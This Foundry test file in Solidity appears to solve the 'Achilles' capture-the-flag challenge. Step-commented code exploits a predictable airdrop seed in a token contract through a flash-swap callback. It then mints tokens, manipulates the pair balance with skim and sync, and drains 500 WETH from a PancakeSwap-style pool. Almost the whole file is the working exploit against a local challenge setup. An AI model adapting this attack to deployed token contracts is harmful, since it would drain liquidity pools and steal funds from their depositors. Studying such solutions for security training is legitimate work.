// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Achilles} from "../ctf/Achilles/contracts/Achilles.sol";
import {PancakePair} from "../ctf/Achilles/contracts/PancakeSwap.sol"; 
import {SetUp} from "../ctf/Achilles/contracts/SetUp.sol";
import {WETH} from "../ctf/Achilles/contracts/WETH.sol";

contract ExploitTest is Test {
  
    SetUp   _sut; 


    function setUp() public {
        _sut = new SetUp();
    }



    // A simple function to compute the "To" address if we want the from to receive the airdrop 
    //   - premise 1 : we assume that tAmount == zero  
    //   - premise 2 : msg.sender == from 
    function computeToAddress(address from) internal returns (address){

        // How the seed is computed in the Achilles contract 
        //
        // uint256 seed = (uint160(msg.sender) | block.number) ^ (uint160(from) ^ uint160(to));
        // 


        // if we want the seed == msg.sender, the to address must be: 

        return address(uint160(from) | uint160(block.number));


    }


    // call back for pair 
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{
        
        // In this callback, we set the airdropAmount to 2 wei
        _sut.achilles().Airdrop(2 wei);

        console2.log("[before manipulation] The balance of Achilles token in the pair address is: %s", _sut.achilles().balanceOf(address(_sut.pair())));

        // Let's mint some Achilles token to ourself by manipulating the airdrop function 
        address to = computeToAddress(msg.sender);
        _sut.achilles().transfer(to, 0);

        console2.log("[after manipulation] The balance of Achilles token in the pair address is: %s", _sut.achilles().balanceOf(address(_sut.pair())));

        // And transfer the Achilles token back to the pair  (+ 1 wei)
        // The Achilles token is token0 

        _sut.achilles().transfer(msg.sender, amount0);


    }

    function test_exploit() external{

        // token0 is Achilles token, initial amount in pair is 1000 ether
        // token1 is WETH token, initial amount in pair is 1000 ether 
        
        // 
        // Step1: make airdropAmount == 2 wei 
        // 

        bytes memory data = abi.encode("any non zero length data");

        _sut.pair().swap(1000 ether - 1 wei, 0, address(this), data );
        

        //
        // Step2: manipuate the balance of the Achilles token in the pair address
        // 
        _sut.pair().skim(computeToAddress(address(_sut.pair())));

        console2.log("The balance of Achilles token in the pair address is: %s", _sut.achilles().balanceOf(address(_sut.pair())));


        //
        // Step3: bump the price of Achilles token 
        // 
        _sut.pair().sync();


        // 
        // Step4: We need some Achilles token to swap WETH out of the pair
        //
        _sut.achilles().transfer(computeToAddress(address(this)), 0);
        console2.log("The balance of Achilles token in address(this) is: %s", _sut.achilles().balanceOf(address(this)));


        // 
        // Step5: Swap and drain some WETH from the pool 
        // 

        console2.log("[before transfer] The balance of Achilles token in the pair address is: %s", _sut.achilles().balanceOf(address(_sut.pair())));
        
        _sut.achilles().transfer(address(_sut.pair()), 2 wei);

        console2.log("[after transfer] The balance of Achilles token in the pair address is: %s", _sut.achilles().balanceOf(address(_sut.pair())));

        _sut.pair().swap(0, 500 ether, address(this), new bytes(0)); // zero bytes, we don't want the callback function be called 




        // check if we have solved the challenge
        assertTrue(_sut.isSolved(), "not solved");
      


    }

}